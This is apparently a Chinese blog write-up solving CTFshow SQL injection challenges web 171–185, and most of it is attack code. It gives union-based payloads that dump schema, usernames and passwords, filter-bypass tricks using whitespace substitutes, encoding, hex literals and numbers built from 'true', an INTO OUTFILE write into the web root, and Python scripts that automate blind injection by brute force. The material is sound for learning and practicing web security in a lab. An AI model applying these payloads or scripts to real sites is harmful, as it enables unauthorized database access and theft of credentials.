---
title: "CTFshow sql注入"
date: 2022-09-15 19:03:45
disableNunjucks: true
---
# web 171

首先使用

```sql
1' --+
```

发现有回显

使用

```sql
1' order by 3--+
```

发现一共是3行

使用联合查询得到当前数据库的名字

```sql
1' union select 1,2,database()--+
```

爆表名：

```sql
-1' union select 1,2,group_concat(table_name) FROM information_schema.tables where table_schema=database()--+
```

爆破列名：

```sql
1' union select 1,2,group_concat(column_name) FROM information_schema.columns where table_schema=database() and table_name='ctfshow_user'--+
```

爆破数据：

```sql
1' union select 1,2,group_concat(id,username,password) FROM ctfshow_user--+
```

# web 172 173

```sql
$sql = "select username,password from ctfshow_user2 where username !='flag' and id = '".$_GET['id']."' limit 1;";
```

从过滤中可知大概就是把flag从查询中ban掉了

**解决方法**

利用编码解决：[base64](https://so.csdn.net/so/search?q=base64&spm=1001.2101.3001.7020)、hex

这里针对的是`id = '".$_GET['id']."'`，双引号是包括在内的，可能只是起解析作用

```sql
yn8'union select to_base64(username),hex(password) from ctfshow_user2--+
```

# web 174

查询语句：

```sql
$sql = "select id,username,password from ctfshow_user2 where username !='flag' and id = '".$_GET['id']."' limit 1;";
```

返回逻辑：

```php
//检查结果是否有flag
    if(!preg_match('/flag|[0-9]/i', json_encode($ret))){
      $ret['msg']='查询成功';
    }
```

[PHP JSON](https://www.runoob.com/php/php-json.html)

也就是说返回的结果是不能有flag和任何数字，那么就先base64编码，再对数字进行替换，比如对password字段的返回结果进行替换，username字段同理，所以payload如下：

```sql
-1' union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(username),'1','numA'),'2','numB'),'3','numC'),'4','numD'),'5','numE'),'6','numF'),'7','numG'),'8','numH'),'9','numI'),'0','numJ'),replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),'1','numA'),'2','numB'),'3','numC'),'4','numD'),'5','numE'),'6','numF'),'7','numG'),'8','numH'),'9','numI'),'0','numJ') from ctfshow_user4 where username='flag' --+
```

然后对爆出的字符串反向替换以下就行了：

```python
import base64

flagstr="YnumCRmcnumBhvdnumCsnumCOTknumEMDdkNynumAhMWIxLTRiYzQtOTEnumJYinumJnumCMWJiZTBlNjFhZTRnumI"
flag=flagstr.replace('numA','1').replace('numB','2').replace('numC','3').replace('numD','4').replace('numE','5').replace('numF','6').replace('numG','7').replace('numH','8').replace('numI','9').replace('numJ','0')
print(base64.b64decode(flag))
```

# web 175

查询语句

```sql
//拼接sql语句查找指定ID用户
$sql = "select id,username,password from ctfshow_user where username !='flag' and id = '".$_GET['id']."' limit 1;";
      
```

返回逻辑

```sql
//对传入的参数进行了过滤
  function waf($str){
   //代码过于简单，不宜展示
  }
      
```

```sql
-1' Union Select id,username,password from ctfshow_user where username='flag' --+
```

将数据输出到一个文件中，然后访问对应文件

```plaintext
-1' union select  username,password from ctfshow_user5 into outfile "/var/www/html/1.txt"--+
```

使用`into outfile '/var/www/html/'`将信息输入到文件中去

# web 176

开始过滤了，第一个是大小写过滤

```sql
-1' Union Select id,username,password from ctfshow_user where username='flag' --+
```

# web 177

第二个是对空格进行了过滤

可以替代空格的有：

```plaintext
%0a
%0b
%0c
%0d
%09
%a0(在特定字符集才能利用)
以上均为URL编码

/**/组合
括号
%23代替注释符 -- 
```

```sql
-1'%09Union%09Select%09id,username,password%09from`ctfshow_user`where`username`='flag'%23
```

```sql
-1'union/**/select/**/id,username,password/**/from`ctfshow_user`where`username`='flag'%23
```

# web 178

上面的注释符也不能用了，可以用tab`%09`代替空格：

```sql
-1'%09Union%09Select%09id,username,password%09from`ctfshow_user`where`username`='flag'%23
```

# web 179

使用换页符%0c代替空格

```sql
-1'union%0cselect%0cid,username,password%0cfrom`ctfshow_user`where`username`='flag'%23
```

# web 180 181 182

```sql
where username !='flag' and id = ''or(id=26)and'1'='1' limit 1
where (username !='flag' and id = '')or(id=26 and'1'='1') limit 1
因为or的存在，相当于要select两次，但又因为or左边是为0的，右边为id=26，所以只select右边
完整的sql语句变为：select id,username,password from ctfshow_user where id=26 limit 1
```

关于优先级问题就跟加减号与乘除号一样，and先运算，那么and的运算结果过程如何解释：需要同时满足两边的条件才会返回true，否则不执行啊！那么这里就是让第一个and语句返回false让后面的and语句来做到知行的效果

**payload：**`'or(id=26)and'1'='1`

# web 183

本题使用post传参，我们使用like进行模糊查询，

解题思路：

```plaintext
括号代替的是空格
tableName=(ctfshow_user)where(pass)like'ctfshow{%'
% ：在sql中通配 N 个字符
_ ：通配任意一个字符
会发现返回结果  $user_count = 1;代表匹配到了一个，利用此模式盲注
```

```python
# -*- coding: utf-8 -*-
import requests
import sys

url = 'http://fce795b7-8a53-4c95-9fe2-e0def05a0df8.challenge.ctf.show/select-waf.php'
letter = '0123456789abcdefghijklmnopqrstuvwxyz-{}'
flag = 'ctfshow{'

for i in range(0,150):
    for j in letter:
        payload = {"tableName":"(ctfshow_user)where(pass)like'{}%'".format(flag+j)}
        r = requests.post(url=url,data=payload).text
        print (r)
        if "$user_count = 1;" in r:
            flag+=j
            print(flag)
            break
        if j=="}":
            sys.exit()
```

# web 184

python脚本

利用到了[mysql中的regexp正则匹配](https://www.runoob.com/mysql/mysql-regexp.html)

[MySQL中的内连接、左连接、右连接、全连接、交叉连接](https://www.cnblogs.com/zeroingToOne/p/9575203.html)

[SQL JOIN 中 on 与 where 的区别](https://www.runoob.com/w3cnote/sql-join-the-different-of-on-and-where.html)：在此脚本中是用on代替了where

利用having来代替where也是作为一个条件判断子句

利用16进制代替引号

```python
# -*- coding: utf-8 -*-
import requests
import sys

url = 'http://683f40c0-31e4-46a7-bed1-f8eb216b7515.challenge.ctf.show:8080/select-waf.php'
flag = 'ctfshow{'
letter = "0123456789abcdefghijklmnopqrstuvwxyz-{}"

def asc2hex(s):
    a1 = ''
    a2 = ''
    for i in s:
        a1+=hex(ord(i))
    a2 = a1.replace("0x","")
    return a2
for i in range(100):
    for j in letter:
        payload = {
            "tableName":"ctfshow_user group by pass having pass like {}".format("0x"+asc2hex(flag+j+"%"))
        }
        r = requests.post(url=url,data=payload).text
        if "$user_count = 1;" in r:
            flag+=j
            print(flag)
            break
            if j == "}":
                sys.exit()
```

# web 185

**mysql中的利用字符组合成的数字：**

![在这里插入图片描述](https://img-blog.csdnimg.cn/20201127190309995.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70#pic_center)

**python脚本：**

```python
# -*- coding: utf-8 -*-
import requests
import sys

def createNum(n):
    num = "true"
    if n == 1:
        return "true"
    else:
        for i in range(n - 1):
            num += "+true"
    return num

def createstrNum(m):
    _str = ""
    for j in m:
        _str += ",chr(" + createNum(ord(j)) + ")"
    return _str[1:]

url = "http://282b6260-a1f9-437d-98f1-a7fb46d977a5.challenge.ctf.show:8080/select-waf.php"
letter = "0123456789abcdefghijklmnopqrstuvwxyz-{}"
flag = "ctfshow{"
for i in range(100):
    for j in letter:
        data = {
            'tableName': 'ctfshow_user group by pass having pass like concat({})'.format(createstrNum(flag + j + "%"))
        }
        res = requests.post(url=url, data=data).text
        # print(res)
        if "$user_count = 1;" in res:
            flag += j
            print(flag)
            break
        if j == "}":
            sys.exit()
```
